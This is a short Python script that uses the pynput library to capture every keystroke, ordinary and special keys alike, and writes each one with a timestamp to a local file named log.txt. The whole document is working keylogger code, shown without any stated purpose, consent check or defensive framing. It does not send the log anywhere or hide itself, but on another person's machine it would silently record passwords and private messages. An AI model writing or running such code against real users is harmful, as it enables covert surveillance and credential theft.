from pynput.keyboard import Listener
import logging

# Logging config
log_file = "log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening
with Listener(on_press=on_press) as listener:
    listener.join()
